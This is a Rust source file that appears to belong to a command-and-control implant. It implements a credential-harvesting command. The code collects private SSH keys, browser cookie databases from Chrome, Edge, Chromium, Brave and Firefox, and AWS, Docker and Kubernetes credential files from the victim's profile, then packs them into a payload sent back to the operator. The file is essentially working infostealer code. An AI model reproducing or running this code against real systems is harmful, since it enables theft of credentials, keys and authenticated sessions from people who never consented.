//! Credential harvesting handler.

use std::path::{Path, PathBuf};

use red_cell_common::demon::DemonCommand;

use super::{DispatchResult, Response, error_output_response, write_bytes_le, write_u32_le};

// ─── COMMAND_HARVEST (2580) ────────────────────────────────────────────────

#[derive(Debug, Clone, PartialEq, Eq)]
pub(super) struct HarvestEntry {
    pub(super) kind: String,
    pub(super) path: String,
    pub(super) data: Vec<u8>,
}

#[derive(Debug, Clone)]
pub(super) struct HarvestRoots {
    pub(super) user_profile: PathBuf,
    pub(super) app_data: Option<PathBuf>,
    pub(super) local_app_data: Option<PathBuf>,
}

pub(super) fn handle_harvest() -> DispatchResult {
    let entries = collect_credentials();
    harvest_dispatch_result(entries)
}

pub(super) fn harvest_dispatch_result(entries: Vec<HarvestEntry>) -> DispatchResult {
    match encode_harvest_entries(&entries) {
        Ok(payload) => {
            DispatchResult::Respond(Response::new(DemonCommand::CommandHarvest, payload))
        }
        Err(message) => error_output_response(&message),
    }
}

fn collect_credentials() -> Vec<HarvestEntry> {
    let Some(roots) = current_harvest_roots() else {
        return Vec::new();
    };
    collect_credentials_for_roots(&roots)
}

fn current_harvest_roots() -> Option<HarvestRoots> {
    let user_profile =
        std::env::var_os("USERPROFILE").or_else(|| std::env::var_os("HOME")).map(PathBuf::from)?;
    Some(HarvestRoots {
        user_profile,
        app_data: std::env::var_os("APPDATA").map(PathBuf::from),
        local_app_data: std::env::var_os("LOCALAPPDATA").map(PathBuf::from),
    })
}

pub(super) fn collect_credentials_for_roots(roots: &HarvestRoots) -> Vec<HarvestEntry> {
    let mut entries = Vec::new();
    collect_ssh_keys(&roots.user_profile, &mut entries);
    collect_browser_cookies(roots, &mut entries);
    collect_known_credential_files(&roots.user_profile, &mut entries);
    entries
}

fn collect_ssh_keys(user_profile: &Path, entries: &mut Vec<HarvestEntry>) {
    let ssh_dir = user_profile.join(".ssh");
    let read_dir = match std::fs::read_dir(&ssh_dir) {
        Ok(read_dir) => read_dir,
        Err(_) => return,
    };

    for entry in read_dir.flatten() {
        let path = entry.path();
        let Ok(metadata) = entry.metadata() else {
            continue;
        };
        if !metadata.is_file() {
            continue;
        }
        let Ok(data) = std::fs::read(&path) else {
            continue;
        };
        if data.is_empty() || !is_private_key_bytes(&data) {
            continue;
        }
        entries.push(HarvestEntry {
            kind: "ssh_key".to_owned(),
            path: path.display().to_string(),
            data,
        });
    }
}

fn is_private_key_bytes(data: &[u8]) -> bool {
    if data.starts_with(b"openssh-key-v1\x00") {
        return true;
    }

    if data.starts_with(b"-----BEGIN") {
        let header_end = data.iter().position(|&b| b == b'\n').unwrap_or(data.len());
        let header = &data[..header_end];
        if !header.windows(b"PUBLIC KEY".len()).any(|window| window == b"PUBLIC KEY") {
            return true;
        }
    }

    false
}

fn collect_browser_cookies(roots: &HarvestRoots, entries: &mut Vec<HarvestEntry>) {
    if let Some(local_app_data) = &roots.local_app_data {
        for relative_path in [
            Path::new("Google/Chrome/User Data/Default/Network/Cookies"),
            Path::new("Google/Chrome/User Data/Default/Cookies"),
            Path::new("Microsoft/Edge/User Data/Default/Network/Cookies"),
            Path::new("Microsoft/Edge/User Data/Default/Cookies"),
            Path::new("Chromium/User Data/Default/Network/Cookies"),
            Path::new("Chromium/User Data/Default/Cookies"),
            Path::new("BraveSoftware/Brave-Browser/User Data/Default/Network/Cookies"),
            Path::new("BraveSoftware/Brave-Browser/User Data/Default/Cookies"),
        ] {
            maybe_push_file(entries, "cookie_db", &local_app_data.join(relative_path));
        }
    }

    if let Some(app_data) = &roots.app_data {
        let firefox_profiles = app_data.join("Mozilla/Firefox/Profiles");
        if let Ok(profiles) = std::fs::read_dir(&firefox_profiles) {
            for profile in profiles.flatten() {
                maybe_push_file(entries, "cookie_db", &profile.path().join("cookies.sqlite"));
            }
        }
    }
}

fn collect_known_credential_files(user_profile: &Path, entries: &mut Vec<HarvestEntry>) {
    for (relative_path, kind) in [
        (Path::new(".aws/credentials"), "credentials"),
        (Path::new(".docker/config.json"), "credentials"),
        (Path::new(".kube/config"), "credentials"),
    ] {
        maybe_push_file(entries, kind, &user_profile.join(relative_path));
    }
}

fn maybe_push_file(entries: &mut Vec<HarvestEntry>, kind: &str, path: &Path) {
    let Ok(data) = std::fs::read(path) else {
        return;
    };
    if data.is_empty() {
        return;
    }
    entries.push(HarvestEntry { kind: kind.to_owned(), path: path.display().to_string(), data });
}

fn encode_harvest_entries(entries: &[HarvestEntry]) -> Result<Vec<u8>, String> {
    let count =
        u32::try_from(entries.len()).map_err(|_| "harvest entry count overflow".to_owned())?;
    let mut payload = Vec::new();
    write_u32_le(&mut payload, count);
    for entry in entries {
        write_bytes_le(&mut payload, entry.kind.as_bytes());
        write_bytes_le(&mut payload, entry.path.as_bytes());
        write_bytes_le(&mut payload, &entry.data);
    }
    Ok(payload)
}
